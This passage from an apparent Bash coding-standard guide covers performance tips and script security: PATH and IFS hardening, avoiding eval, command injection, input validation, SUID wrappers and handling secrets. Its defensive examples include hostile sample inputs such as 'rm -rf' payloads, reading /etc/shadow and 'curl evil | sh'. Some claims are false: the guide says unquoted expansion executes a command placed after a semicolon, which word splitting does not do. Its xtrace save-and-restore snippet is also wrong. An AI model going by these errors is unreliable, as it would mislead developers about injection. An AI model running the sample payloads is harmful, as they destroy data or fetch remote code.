| Strip directory | `$(dirname "$f")` | `${f%/*}` |
| Get extension | `$(echo "$f" | awk -F. '{print $NF}')` | `${f##*.}` |
| Lowercase | `$(echo "$s" | tr A-Z a-z)` | `${s,,}` |
| Replace all | `$(echo "$s" | sed 's/old/new/g')` | `${s//old/new}` |
| Substring | `$(echo "$s" | cut -c2-5)` | `${s:1:4}` |

- Each parameter-expansion replacement avoids one fork.
- 10,000 iterations × 1 fork × 1 ms = 10 seconds saved.
- Code is shorter and clearer too.

## 19.9 Pipes vs redirection

`cmd > out 2>&1` instead of `cmd 2>&1 | tee out` when no filtering needed.

- Pipes always involve a subshell.
- Redirection is fd manipulation in the same process.
- For "log everything to a file", redirection is direct.
- For "log AND show", `tee` (with the pipe) is the right tool.

```bash
cmd() { printf 'data\n'; printf 'warning\n' >&2; }   # placeholder

# wrong — extra subshell, no terminal output anyway
cmd 2>&1 | tee log.txt >/dev/null

# right — pure redirection, same effect, no fork
cmd >log.txt 2>&1
echo "log.txt size:"            # ⇒ log.txt size:
wc -c < log.txt                 # → byte count of the captured stream
```

```bash
# scenario: log-and-show — tee is the right tool, but mind pipefail
set -o pipefail
cmd 2>&1 | tee -a log.txt
# ⇒ tee's exit status (almost always 0) does NOT mask cmd's failure under pipefail
```

Without `pipefail` (BCS0101 strict mode), `cmd | tee` returns `tee`'s
status — masking `cmd` failures. With `pipefail` set, the rightmost
non-zero status wins, so `cmd`'s exit propagates. Always pair `tee` with
`set -o pipefail`, or capture status from `${PIPESTATUS[0]}` immediately
after the pipeline.

**See also**: §19.10 (builtins vs externals), BCS0101 (strict mode), BCS0711 (combined redirection).

## 19.10 Builtins vs externals

A short list of frequent external→builtin replacements.

- `cat file` → `< file` for redirection, `$(<file)` for capture.
- `echo "$var"` → `printf '%s\n' "$var"`.
- `[ ]` → `[[ ]]`.
- `expr` arithmetic → `(( ))` or `$(( ))`.
- `basename file` → `${file##*/}`.
- `dirname file` → `${file%/*}`.
- `tr A-Z a-z` → `${var,,}`.
- `wc -l <<<"$multi"` → use array and `${#arr[@]}`.
- `head -n 1 file` → `read -r line < file`.
- `sleep 0.1` → no builtin equivalent; use external (or `read -t 0.1` with a closed fd as a hack).

## 19.11 Bash 5.3 no-fork command substitution

`${ command; }` runs command in the current shell, no fork.

- Bash 5.3+ only.
- Same syntax as parameter expansion but with `cmd; }`.
- Captures stdout into the substitution result without spawning a subshell.
- Saves the ~1 ms subshell cost per call.
- Caveat: command runs in current shell, so variable changes persist (a feature for some uses, a bug for others).
- Not yet portable; use only if you can require Bash 5.3+.

```bash
# scenario: contrast variable-leak side-effect
counter=0

# classic — subshell isolates side-effects
result=$(counter=99; printf '%s\n' "hit")
printf 'classic: result=%s counter=%s\n' "$result" "$counter"
# ⇒ classic: result=hit counter=0

# bash 5.3+ — no fork, side-effects leak into caller
# (the snippet below is only legal under bash 5.3+; under 5.2 it is a
#  syntax error, so it is illustrated as a comment rather than executed.)
#   result=${ counter=99; printf '%s\n' "hit"; }
#   printf 'no-fork: result=%s counter=%s\n' "$result" "$counter"
#   → "no-fork: result=hit counter=99"
```

The performance win is real (~1 ms per call), but the variable-leak
behaviour means you cannot use `${ … }` as a drop-in replacement for
`$( … )`. Reserve it for hot loops where you control all assignments
inside the block, and document the choice next to the call site.

**See also**: §19.1 (cost model), §13.04 (command substitution), §25 (Bash 5.3 future).

## 19.12 Memory considerations

Bash uses memory for variables, arrays, and process state.

- Each variable: small fixed overhead plus value size.
- Large strings: bash duplicates on assignment (some optimisations apply).
- Arrays: O(N) for indexed; O(N) for associative with hash-table overhead.
- Subshell fork: copy-on-write; minimal cost until writes.
- `unset` releases memory; without it, lifetime is shell-lifetime.
- Reading a 100 MB file into a variable: avoid; stream instead.

Bash internals — variables live in a global hash table (`variables.c`),
arrays in `array.c`, copy-on-write applies to forked subshells via the
kernel's standard fork semantics. Slurping a file uses RAM proportional
to file size; streaming uses RAM proportional to one line.

```bash
# wrong — slurp: RAM grows with file size; bash duplicates on assignment
data=$(<huge.log)
while IFS= read -r line; do process "$line"; done <<< "$data"

# right — stream: O(1) memory regardless of file size
while IFS= read -r line; do process "$line"; done < huge.log
```

The `<huge.log` redirect feeds the loop one line at a time; the loop body
sees `line` and nothing else holds the file in memory. For multi-pass
processing, prefer two streams over one slurp; for indexed random access,
use `mapfile -O start -n count` to load slices, not the whole file.

**See also**: §19.1 (cost model), §19.7 (common optimisations), §06.05 (input redirection).

## 19.13 When Bash is the wrong tool

Bash has limits. Recognise them.

- Numerical computation: use Python/Julia/Octave.
- Complex string parsing (JSON, XML, YAML): use `jq`/`yq`/`xmllint`.
- Tight loops with millions of iterations: use Python or compiled.
- True parallelism: use a real language or GNU parallel.
- Large data structures: use a real language.
- Long-running daemons with state: consider Go, Python, or systemd-managed.
- The "if this script is over 500 lines, consider rewriting it" heuristic.

# Part XX — Security

*Bash scripts run with the privileges of the invoking user — often root. This Part documents the threat model, the attack surface, and the defensive disciplines.*

---

---

## 20.1 Threat model

Bash scripts run with the privileges of their invoker, frequently root, and
inherit a process environment they did not choose. Before reaching for
mitigations, classify the threats that actually apply to the script in front
of you; the remaining chapters of Part 20 address each class concretely.

The threat classes below are not mutually exclusive — a single CVE often
chains two or three. Each class is illustrated by one minimal vector that
captures the essence of the attack; the deeper treatment is cross-referenced.

**User-input attacks** — untrusted data flows into command construction. The
classic shell footgun: a string the script believes to be a filename is in
fact a fragment of shell. See §20.5 for the full catalogue and §20.6 for the
allow-list response.

```bash
# scenario: log filename arrives from an HTTP query parameter
read -r logfile        # attacker supplies: x; rm -rf "$HOME"
cat $logfile           # ⇒ unquoted expansion executes the trailing command
```

**Path-based attacks** — `PATH` resolves a bare command name to a binary the
script did not intend (BCS1002). A writable directory early in `PATH` is
sufficient.

```bash
# scenario: PATH=/tmp:/usr/bin and /tmp/ls exists
ls /var          # ⇒ runs /tmp/ls, not /usr/bin/ls
```

**TOCTOU races** — time-of-check vs time-of-use. The window between a test
and the operation it guards is exploitable; see §20.13.

```bash
# scenario: between -w test and >> append, attacker swaps the file
[[ -w $f ]] && echo "$payload" >> "$f"   # ⇒ append lands in the substituted target
```

**Symlink attacks** — a special case of TOCTOU, distinct enough to merit its
own chapter (§20.13). Attacker controls a path component, typically inside a
shared directory such as `/tmp`.

```bash
# scenario: predictable temp path
echo "$secret" > /tmp/myscript.$$    # ⇒ symlink to /etc/passwd, root truncates passwd
```

**Environment injection** — attacker controls environment variables that the
script reads or that bash itself consumes (`IFS`, `BASH_ENV`, `LD_PRELOAD`,
`PATH`). See §20.3 (IFS), §20.2 (PATH), and §20.1.7 below for the env-scrub
mandate (BCS1007).

```bash
# scenario: attacker exports IFS before invoking the script
IFS=$'\n,' ./script.bash          # ⇒ word splitting now treats commas as separators
```

**Tempfile attacks** — predictable filenames, races in world-writable
directories, leftovers retaining secrets. The canonical remedy is `mktemp`
(BCS1006) plus a cleanup trap; full pattern in §20.13.

```bash
# scenario: predictable filename in /tmp
out=/tmp/report.$$                 # ⇒ guessable, hijackable
```

**Privilege escalation** — SUID on scripts (Linux refuses; §20.8), sudo
invocations that trust caller-controlled data, and "root-on-behalf" wrappers
that fail to validate their caller's intent. The remedies are early
privilege drop (§20.11) and minimal sudoers entries (§20.8).

```bash
# scenario: sudo wrapper trusts $1 as a path
sudo cp -- "$1" /etc/important.conf   # ⇒ caller passes /etc/shadow, gets root copy
```

**Resource-exhaustion attacks** — fork bombs, log-floods, runaway recursion.
Often dismissed as DoS-only, but in privileged contexts they enable race
windows that other attacks ride on.

```bash
# scenario: untrusted input drives a recursive descent
find "$user_dir" -exec process {} \;   # ⇒ deep symlink loop exhausts inodes
```

For each class, ask three questions before writing a mitigation:
1. What untrusted boundary does data cross to reach this script?
2. What privileges does this script hold that the data's source does not?
3. Which BCS rule (BCS1001–BCS1007) names the discipline I am about to apply?

If you cannot answer all three, the mitigation is premature.

**See also**: §20.4 eval avoidance, §20.5 command-injection vectors, §20.6
input validation, §20.13 symlink races, BCS1001–BCS1007.

## 20.2 PATH hardening

Hard-code `PATH` early in privileged scripts (BCS1002).

```bash
declare -rx PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/usr/bin:/bin'
```

- Prevents attacker-controlled PATH from changing which binary `cd`, `cp`, etc., resolves to.
- Order matters: place trusted directories first.
- Never include `.` (current directory) in PATH.
- For scripts running as root, this is mandatory; for user scripts, recommended.

`declare -rx` makes the value read-only **and** exported, so the hardened
PATH propagates to children and cannot be reassigned later in the script.
Combine with `IFS` reset (§20.3) — PATH parsing uses IFS in some legacy
constructs, and a tampered IFS can split a benign PATH into attacker-
controlled fragments.

```bash
# scenario: sudo inheritance — PATH is reset by secure_path, but not by sudo -E
sudo printenv PATH                  # ⇒ /usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/usr/bin (secure_path)
sudo -E printenv PATH               # ⇒ inherits caller's PATH — DANGEROUS
sudo -i printenv PATH               # ⇒ login shell PATH from /root/.profile

# right — never trust inherited PATH; reset at the top of any privileged script
declare -rx PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/usr/bin:/bin'
declare -rx IFS=$' \t\n'
```

The default `sudoers` `secure_path` line sanitises PATH for `sudo cmd`,
but `sudo -E` (preserve environment) and SUID binaries do not. Treat the
hardened-PATH assignment as mandatory boilerplate for any script that may
run with elevated privilege.

**See also**: §20.3 (IFS reset), §20.11 (privilege drop), BCS1002 (PATH security), BCS1003 (IFS).

## 20.3 IFS reset

Set IFS to known safe value at script start (BCS1003).

```bash
declare -rx IFS=$' \t\n'
```

- Default IFS is space-tab-newline; explicit reset asserts this.
- Inherited IFS could split words unexpectedly.
- Save and restore around scoped changes.

```bash
# scenario: IFS-injection demo — caller exports a malicious IFS
export IFS=':'                       # attacker sets this in environment

# vulnerable script reads PATH-like data and word-splits it
input='alpha beta gamma'
for word in $input; do echo "<$word>"; done
# ⇒ <alpha beta gamma>             (no split — IFS no longer contains space)

# right — reset IFS at script entry
declare -rx IFS=$' \t\n'
for word in $input; do echo "<$word>"; done
# ⇒ <alpha>
# ⇒ <beta>
# ⇒ <gamma>
```

For scoped changes (e.g., to read CSV), save and restore explicitly:

```bash
# scenario: temporary IFS change with restore
parse_csv() {
  local -- saved_ifs="$IFS"
  IFS=','
  read -r -a fields <<<"$1"
  IFS="$saved_ifs"
  printf '%s\n' "${fields[@]}"
}
```

Or — preferred — use a `local IFS=…` inside the function so the change is
automatically scoped to the function body:

```bash
parse_csv() {
  local -- IFS=','
  local -a fields
  read -r -a fields <<<"$1"
  printf '%s\n' "${fields[@]}"
}
```

`local IFS` shadows the global; on function return the original is
restored automatically — no manual save/restore needed.

**See also**: §20.2 (PATH hardening), §05.07 (word splitting), BCS1003 (IFS safety).

## 20.4 `eval` avoidance

`eval` re-parses its argument as shell input. Any data that flows into the
argument becomes executable shell. The BCS prohibition (BCS1004) is
absolute outside of literals the script itself constructed.

The most common misuse — by an order of magnitude — is dynamic variable
naming: building a variable name from input and assigning to it via `eval`.
Bash 4.3+ provides namerefs (`declare -n`) and associative arrays
(`declare -A`) that solve this without re-parsing.

```bash
# scenario: dynamic-name assignment driven by user input
# wrong — eval re-parses the right-hand side
key=$1; value=$2
eval "var_$key=$value"
# attacker invokes:  ./script "x; rm -rf \$HOME #" "anything"
# ⇒ shell sees: var_x; rm -rf $HOME #=anything
```

The right-hand side is fully attacker-controlled in two places: the variable
name (`$key`) and the value (`$value`). Quoting the value does not help —
`eval` strips one layer of quoting before re-parsing.

```bash
# scenario: same dynamic-name assignment, refactored with a nameref
declare -- key=$1 value=$2
[[ $key =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || die 22 'invalid key'
declare -n ref="var_$key"
ref=$value                          # ⇒ regular assignment, no re-parse
unset -n ref
```

The nameref still requires the *name* to be validated as a shell identifier
(BCS1005) — bash will reject `ref=...` if the target name contains
metacharacters, but only after the assignment is attempted, and the error
message leaks the bad name. Validate up-front.

For variable-by-key registries the cleaner pattern is an associative array,
which sidesteps name-construction entirely:

```bash
# scenario: keyed registry; key is data, not a variable name
declare -A registry=()
registry[$key]=$value               # ⇒ key is data; no shell parsing of it
echo "${registry[$key]}"
```

The registry pattern dominates the nameref pattern when the keys are truly
data; reserve namerefs for the rare case where downstream code expects to
read a fixed variable name.

The other notorious misuse is `eval "$(getopt …)"` for argument parsing.
Replace it with the hand-rolled parser pattern (BCS0801) — a `while`/`case`
loop that walks `"$@"` directly. The few cases where `eval` survives audit
in production scripts are: re-executing a saved command line built entirely
from validated literals, and `eval "$(ssh-agent -s)"` style wrappers where
the producer is trusted and the consumer immediately exits on failure.

For every surviving `eval`, add a comment naming the trust boundary:

```bash
# eval: input is the output of `ssh-agent -s` (trusted local fork)
eval "$(ssh-agent -s)"
```

### Indirect expansion without `eval`

A frequent reason developers reach for `eval` is to read a variable whose
name is held in another variable. Bash provides `${!ref}` indirection for
exactly this — no re-parse required:

```bash
# scenario: read a value via a name held in another variable
# wrong — eval re-evaluates the entire RHS
eval "echo \$var_$key"

# right — bash parameter indirection
declare -- name="var_$key"
echo "${!name}"                     # ⇒ value of var_$key, no re-parse
```

Indirection still expects the *name* to be a valid identifier; validate
`$key` as in the nameref example above.

### Auditing existing code

Treat every `eval` as a comment-required event. A repository sweep looks
like:

```bash
# scenario: locate every eval call site for review
grep -rnE '\beval\b' --include='*.bash' --include='*.sh' . || true
# (rc=1 is fine — it just means no `eval` calls found)
```

Triage each hit into one of three buckets: trusted-literal (keep with
comment), refactor-candidate (replace with nameref/assoc-array/`${!ref}`),
or outright removal. The third category is the largest in most legacy
codebases.

### Why `declare`, `local`, `printf -v` are not safer

A common confusion: `declare "var_$key=$value"` and `local "var_$key=$value"`
*do* re-parse the right-hand side under expansion, though not as a full
shell command. `printf -v "var_$key" '%s' "$value"` is the genuinely safe
version because `printf -v` accepts the variable name as data and the
value via format processing only. When namerefs are not available
(targeting bash < 4.3), use `printf -v`:

```bash
# scenario: bash 4.2 fallback for dynamic-name assignment
[[ $key =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || die 22 'invalid key'
printf -v "var_$key" '%s' "$value"  # ⇒ name is data, value is data
```

**See also**: §20.5 command-injection vectors, §20.6 input validation,
BCS1004 eval avoidance, BCS0801 standard parsing pattern.

## 20.5 Command injection vectors

Command injection is the central footgun of shell programming: attacker-
controlled data becomes attacker-executed code. The vectors below catalogue
the principal ways data crosses into the parser. Each is given as a
vulnerable/fixed pair and ends with the canonical allow-list-then-positional
pattern that retires the entire class.

### Vector 1 — Unquoted expansion

```bash
# scenario: copy a user-named log into archive
# wrong — unquoted $logfile is word-split, then pathname-expanded
cp $logfile /var/archive/
# attacker supplies: 'a; rm -rf /etc'
# ⇒ shell sees: cp a ; rm -rf /etc /var/archive/
```

Word splitting and pathname expansion (BCS0301) operate on the *result* of
parameter expansion, so the attacker's metacharacters become tokens before
`cp` sees them.

```bash
# scenario: same operation, quoted and `--` terminated
cp -- "$logfile" /var/archive/      # ⇒ a single argument, even with spaces or ;
```

Quoting blocks splitting but does not validate content; a filename of `-rf`
or `../etc/passwd` still reaches `cp`. Quoting is necessary, never
sufficient.

### Vector 2 — `find -exec sh -c` with interpolated input

```bash
# scenario: walk a directory and run a transform on each file
# wrong — $user_cmd is interpolated into the inner shell
find . -type f -exec sh -c "$user_cmd \"\$0\"" {} \;
# attacker supplies user_cmd='cat /etc/shadow #'
# ⇒ inner sh runs:  cat /etc/shadow #"$0"
```

The `find -exec sh -c` idiom invites injection because the inner shell
re-parses the string. Passing arguments positionally to a fixed inner script
sidesteps re-parsing entirely.

```bash
# scenario: positional pass-through; inner sh does not see user content
mkdir -p _demo && : > _demo/a.txt && : > _demo/b.txt
find _demo -type f -exec sh -c '
  for f; do
    printf "processed: %s\n" "$f"   # stand-in for `process_one -- "$f"`
  done
' sh {} +                           # → {} are passed as "$@", not re-parsed
# ⇒ processed: _demo/a.txt
# ⇒ processed: _demo/b.txt
# (no cleanup — illustrative; in real code remove the demo tree afterwards)
```

The `sh` after `-c '…'` becomes `$0`; subsequent `{}` arrive as positional
arguments. No interpolation, no re-parse.

### Vector 3 — `eval` over input

```bash
# scenario: parse a key=value config string supplied by user
# wrong — eval re-parses
eval "$cfg_line"                    # cfg_line='X=1; curl evil | sh'
# ⇒ shell executes the trailing pipeline
```

The fix is to parse without `eval` — split on `=`, validate the key,
validate the value, then assign or store (§20.4):

```bash
# scenario: same config-line parse, no eval
[[ $cfg_line =~ ^([A-Z_][A-Z0-9_]*)=(.*)$ ]] || die 22 'bad config'
declare -- k=${BASH_REMATCH[1]} v=${BASH_REMATCH[2]}
declare -A cfg=()
cfg[$k]=$v                          # ⇒ key validated, value stored as data
```

### Vector 4 — Embedded interpreter (`bash -c`, `ssh remote-cmd`, `xargs sh -c`)

Every embedded interpreter is a fresh injection surface. `ssh host "cmd $x"`
re-parses on the *remote* host; `xargs -I{}` interpolates blindly. The fix
is identical to Vector 2: pass data as positional arguments, never as
in-line script text.

```bash
# wrong — remote shell re-parses
ssh host "rm -- $remote_path"

# scenario: remote shell receives a fixed script with positional args
printf -- '%s\0' "$remote_path" \
  | ssh host 'xargs -0 -I{} rm -- "{}"'   # ⇒ no interpolation on either side
```

### The canonical fix — allow-list, then positional

The only pattern that retires the entire class is to validate input against
an allow-list (BCS1005), then pass it as a positional argument to a fixed
command. The validator's regex defines the safe subset; everything else is
rejected with a non-zero exit (BCS0602).

```bash
# scenario: download a named asset; name comes from caller
download_asset() {
  local -- name=$1
  [[ $name =~ ^[a-z][a-z0-9_-]{0,63}$ ]] \
    || { error "invalid asset name: ${name@Q}"; return 22; }
  curl --fail --silent --output "$ASSET_DIR/$name" \
    -- "https://assets.example.com/$name"
}
```

The validator does three things: it caps length (defends against buffer-
adjacent attacks downstream), pins the alphabet (no `..`, no `/`, no `;`),
and anchors with `^…$` (no prefix or suffix injection). The data then flows
to `curl` as a positional argument, never as part of a string the shell
re-parses.

**See also**: §20.4 eval avoidance, §20.6 input validation, §20.12
sanitising filenames, BCS1004, BCS1005, BCS0301.

## 20.6 Input validation

Validate every piece of untrusted data on entry, against an allow-list, and
exit non-zero on any failure (BCS1005). Deny-lists fail to anticipate
encoding tricks (`%2e%2e`, NUL bytes, RTL overrides) and metacharacter
combinations; allow-lists name the safe subset and refuse the rest.

### Validator-function template

A single parameterised validator covers most cases. It takes a *kind* and a
*value*, returns 0 if the value satisfies that kind's rule, non-zero
otherwise. The caller decides how to fail (warn, retry, exit):

```bash
# scenario: parameterised validator over named input kinds
validate_kind() {
  local -- kind=$1 value=${2-}
  case $kind in
    id)        [[ $value =~ ^[1-9][0-9]{0,8}$ ]]                ;;
    username)  [[ $value =~ ^[a-z_][a-z0-9_-]{0,31}$ ]]         ;;
    filename)  [[ $value != *$'\0'* ]] \
                && [[ $value != /* ]] \
                && [[ $value != -* ]] \
                && [[ $value != *..* ]] \
                && [[ $value =~ ^[[:print:]]+$ ]] \
                && (( ${#value} <= 255 ))                       ;;
    hex)       [[ $value =~ ^[0-9a-f]+$ ]] && (( ${#value} <= 128 )) ;;
    iso_date)  [[ $value =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]]     ;;
    *)         error "validate_kind: unknown kind: ${kind@Q}"
               return 2 ;;
  esac
}
```

Key points: the `filename` arm rejects four hazardous shapes — embedded
NUL, leading `/` (absolute path), leading `-` (would be parsed as an
option), and any `..` component (traversal) — before applying the
character-class regex. NUL must be checked first because regex matching of
strings containing NUL is implementation-defined. Length is capped after
content checks because `${#value}` on a long pathological input is cheap
but the regex is not.

The caller wires the validator to the script's exit-on-bad-input policy:

```bash
# scenario: CLI parser rejects bad input with BCS exit code 22
cmd_archive() {
  local -- target=${1:?target required}
  validate_kind filename "$target" \
    || die 22 "archive: invalid filename: ${target@Q}"
  process -- "$target"
}
```

### Filename traversal — worked rejection

Path traversal is the highest-impact filename attack: `../../etc/passwd`
escapes the intended directory. The `filename` arm above rejects any
`..` *component*, not just a leading `..`; this is necessary because
`a/../b` reaches `b` from outside `a`'s subtree. Combined with `realpath`
canonicalisation (§20.12) and a final containment check, the script can
prove the resolved path stays inside the permitted root:

```bash
# scenario: confirm sanitised filename resolves inside $ASSET_ROOT
validate_kind filename "$name" \
  || die 22 "invalid filename: ${name@Q}"
abs=$(realpath -- "$ASSET_ROOT/$name")
[[ $abs == "$ASSET_ROOT"/* ]] \
  || die 22 "path escapes asset root: ${name@Q}"
```

Validate at the trust boundary (typically the CLI parser or RPC entry
point), not at point of use — by the time data reaches `cp` or `curl`, it
has usually been concatenated with other strings and the original boundary
has been lost.

### Length caps before content checks

Length capping comes *before* expensive validation when the input crosses
an untrusted boundary. A 100 MB "filename" is itself an attack: regex
engines run in O(n) on the input, and even cheap operations like
`${#value}` allocate the full string. A two-line guard at the top of any
public entry point neutralises this:

```bash
# scenario: cap input length before any other validation
(( ${#raw} <= 4096 )) \
  || die 22 "input too long: ${#raw} bytes"
```

The 4096 cap is `PATH_MAX` on Linux; choose a smaller cap when the value
is a name rather than a path.

### Numeric ranges, not just numeric type

Numeric validation needs both a type-and-shape check and a range check.
A "user ID" matching `^[0-9]+$` still admits values that overflow
`uid_t`:

```bash
# scenario: validated numeric with an explicit range
[[ $uid =~ ^[1-9][0-9]{0,9}$ ]] && (( uid >= 1000 && uid <= 65533 )) \
  || die 22 "uid out of range: ${uid@Q}"
```

The two-stage check matters: the regex pre-flight prevents `((uid))` from
choking on non-numeric input under `set -e`, and the range check enforces
the actual policy.

**See also**: §20.5 command-injection vectors, §20.12 sanitising filenames,
BCS1005 input sanitization, BCS0602 exit codes.

## 20.7 Quoting under `set -u`

Quoted unset variables expand to nothing; unquoted may error.

- `"$var"` — expands to empty string if unset (under `set -u`, errors).
- `"${var:-}"` — explicitly default to empty.
- For optional args: `"${1:-}"`.
- For arrays that may be empty: `"${arr[@]:-}"`.
- BCS pattern: declare every variable with `declare` to avoid `set -u` traps (BCS0201).

```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit extglob nullglob

# scenario: argv parser that survives empty argv under set -u
declare -- mode=''
declare -i verbose=0
declare -a files=()

while (($#)); do
  case "${1:-}" in
    -v|--verbose) verbose=1 ;;
    -m|--mode)    shift; mode="${1:?--mode requires an argument}" ;;
    --)           shift; files+=( "${@:-}" ); break ;;
    -*)           printf >&2 'unknown: %s\n' "$1"; exit 22 ;;
    *)            files+=( "$1" ) ;;
  esac
  shift
done

# right — guard array expansion so the loop body is reached even when files is empty
for f in "${files[@]:-}"; do
  [[ -n "$f" ]] || continue
  printf 'process: %s\n' "$f"
done

```

Three pattern points: `"${1:-}"` in `case` keeps the parser alive when
`$#` is zero; `"${1:?msg}"` after `shift` enforces a required argument
with a tailored error; `"${arr[@]:-}"` lets `for` survive an empty array
under `set -u`. Without the `:-` defaults, each of these would trip a
`unbound variable` exit before your error message ran.

**See also**: §20.6 (input validation), BCS0101 (strict mode), BCS0201 (declarations).

## 20.8 SUID restrictions

Linux silently ignores the SUID bit on interpreted scripts (BCS1001). The
kernel design reflects an unfixable race: between the kernel reading the
shebang and the interpreter `open(2)`-ing the script, an attacker on the
same filesystem can substitute a different file. macOS still honours SUID
on scripts; doing so on any platform is unsafe regardless of OS support.

Two supported alternatives exist for "shell needs to run as another user":
a sudoers entry, or a small C wrapper that exec's the script with a
sanitised environment.

### Alternative 1 — `sudoers` with `NOPASSWD` and a command alias

The `sudoers` route is correct when one or two specific commands need
elevated privileges and an interactive admin is not available. Pin the
exact command path and arguments using a `Cmnd_Alias`; never permit a
wildcarded command:

```sudoers
# /etc/sudoers.d/backup-runner — installed mode 0440, owned root:root
Cmnd_Alias BACKUP_CMDS = /usr/local/sbin/backup-now, \
                         /usr/local/sbin/backup-verify

backup ALL=(root) NOPASSWD: BACKUP_CMDS
Defaults!BACKUP_CMDS env_reset, secure_path="/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin"
```

Three properties matter: the command paths are absolute (no `PATH`
search), arguments are not wildcarded (`*` in sudoers is regex-naive and
typically over-permissive), and `env_reset` plus `secure_path` strip the
caller's environment. The `backup-runner` script is owned root, mode 0755,
in a directory the `backup` user cannot write.

Verify the entry parses and that the matrix is what you expected:

```bash
visudo -cf /etc/sudoers.d/backup-runner   # ⇒ exits 0 if valid
sudo -lU backup                            # ⇒ shows allowed commands
```

### Alternative 2 — SUID C wrapper

When `sudo` is unavailable (containers, embedded targets), a small SUID C
binary is the textbook substitute. The wrapper's job is to clear the
environment, restore a known `PATH`, and `execv` the real script. It must
be tiny, audited, and never grow features.

```c
/* backup-wrapper.c — compile: gcc -O2 -Wall -Wextra -o backup-wrapper backup-wrapper.c
 * install:  install -m 4755 -o root -g root backup-wrapper /usr/local/sbin/
 */
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
  (void)argc; (void)argv;
  if (clearenv() != 0) return 1;
  if (setenv("PATH", "/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin", 1) != 0)
    return 1;
  if (setenv("IFS", " \t\n", 1) != 0) return 1;
  /* drop saved-uid is automatic on execv since binary is SUID-root */
  char *const av[] = { "/usr/local/sbin/backup-now", NULL };
  execv(av[0], av);
  return 127;
}
```

The wrapper accepts no arguments — passing argv through is the most common
mistake, since shell metacharacters in argv become injection in the script
(§20.5). If arguments are required, validate them in C against an
allow-list before exec.

Never set the SUID bit on a bash script even on platforms that honour it,
and never rely on `sudo -E` (which preserves the environment) for trusted
scripts; preserve only what you whitelist.

**See also**: §20.5 command-injection vectors, §20.11 privilege drop,
BCS1001 SUID/SGID prohibition, BCS1007 environment scrubbing.

## 20.9 Secrets handling

Secrets — API tokens, private keys, passwords — must never appear in
process tables, trace output, log files, or version control. The threat
model is local-user adjacent (a low-privilege user on the same host) plus
the operator looking over their own shoulder at a `set -x` log.

### Storage and transport — visibility matrix

| Channel              | Visible to                                      | Verdict                          |
|----------------------|-------------------------------------------------|----------------------------------|
| Command-line args    | Any user via `ps eww`                           | Forbidden                        |
| Environment variables| Same-user processes via `/proc/PID/environ`     | Acceptable for own process       |
| Mode 0600 file       | Owner only                                      | Acceptable                       |
| `/dev/shm` file      | Same as 0600 file but cleared on reboot         | Acceptable for short-lived       |
| stdin pipe           | Same as args' parent process                    | Preferred for child processes    |

Ranked preference: stdin pipe ≻ env var (own-process) ≻ mode-0600 file ≻
`/dev/shm` ≻ argv. Vendor secret managers (HashiCorp Vault, AWS Secrets
Manager, GCP Secret Manager) are the source of truth; their CLI clients
emit secrets on stdout for piping into downstream consumers — see vendor
docs for invocation.

### Process-arg leak — the `ps eww` demonstration

The argv channel is the easiest to misuse and the easiest to demonstrate:

```bash
# scenario: secret passed as a CLI flag — visible to every user on the host
curl --user "alice:$PASSWORD" https://api.example.com/  &
sleep 0.5
ps eww -p $!                       # ⇒ shows: curl --user alice:s3cret https://...
wait
```

Any unprivileged process can read `/proc/<pid>/cmdline`; `ps eww` even
spills the environment. The fix is the tool's stdin-secret variant:

```bash
# scenario: same call, secret arrives on stdin via --config
printf -- 'user = "alice:%s"\n' "$PASSWORD" \
  | curl --config - https://api.example.com/
                                    # ⇒ argv contains no secret; stdin is process-private
```

When a tool offers no stdin variant (rare, but check first), pass via env
var and document the choice; never construct the secret into argv.

### `set -x` discipline — scoped disable

`set -x` traces every expansion, including secret-bearing arguments. The
canonical scoped-disable pattern saves the option state, disables tracing
for the duration of the secret-using command, and restores afterwards —
all redirected so the disable itself does not leak via the trace stream:

```bash
# scenario: scoped trace disable around a secret-using call
{ set +x; } 2>/dev/null               # disable, swallow the trace of the disable
api_call --secret-from-env            # SECRET in env, not argv
saved_xtrace=$-                        # capture current option state
{ [[ $saved_xtrace == *x* ]] && set -x; } 2>/dev/null
```

In practice the simpler one-liner suffices for a single secret-using call:

```bash
# scenario: one-shot disable, immediate restore
api_call() { :; }     # placeholder for the real client; the trace is the demo
{ set +x; api_call --secret-from-env; set -x; } 2>/dev/null
```

The outer `{ … } 2>/dev/null` blocks the `+ set -x` line that bash would
otherwise emit on stderr. If your script does not rely on `set -x` being
on after the call, drop the restore.

### Logging discipline

Every `info`/`warn`/`error` invocation that touches a secret-bearing
variable is a leak. Audit with `grep -nE '\$(PASS|TOKEN|SECRET|KEY)' script`
and require redaction in messaging functions:

```bash
# scenario: redacted error message
error "auth failed for user ${user@Q} (secret length: ${#PASSWORD})"
# ⇒ logs the length, never the value
```

### Reading secrets — `read -s` and file mode

Interactive prompts must use `read -s` (silent) so the value never reaches
the terminal:

```bash
# scenario: prompt for a passphrase without echo
read -rs -p 'Passphrase: ' PASSPHRASE
printf '\n'                          # newline manually since -s suppressed it
```

For credentials read from a file, validate the file mode before reading.
If the file is group- or world-readable, refuse to load:

```bash
# scenario: refuse to load a credential file with loose permissions
declare -r CRED=/etc/myservice/api.token
mode=$(stat -c '%a' -- "$CRED")
[[ $mode == 600 || $mode == 400 ]] \
  || die 13 "permissions on $CRED must be 600 or 400 (got $mode)"
TOKEN=$(<"$CRED")
```

The mode check fails closed: missing file, unreadable file, or wrong mode
all exit non-zero.

### Lifetime — `unset` after use

Secrets in shell variables persist until the variable is unset or the
process exits. For scripts that fork children after the secret is no
longer needed, `unset` reduces the leak surface — children no longer
inherit the value:

```bash
# scenario: clear secret immediately after use
api_call --secret-from-env || die 1 'auth failed'
unset -v PASSPHRASE TOKEN PASSWORD   # ⇒ removed from env for any later forks
```

`unset -v` is preferred over plain `unset` to avoid the rare collision
with a function of the same name.

**See also**: §20.5 command-injection vectors, §20.7 quoting under set -u,
BCS1005 input sanitization, BCS0703 core messaging system.

## 20.10 `noclobber`

`set -o noclobber` (or `set -C`) prevents `>` from overwriting existing files.

- `cmd > existing.txt` errors with noclobber.
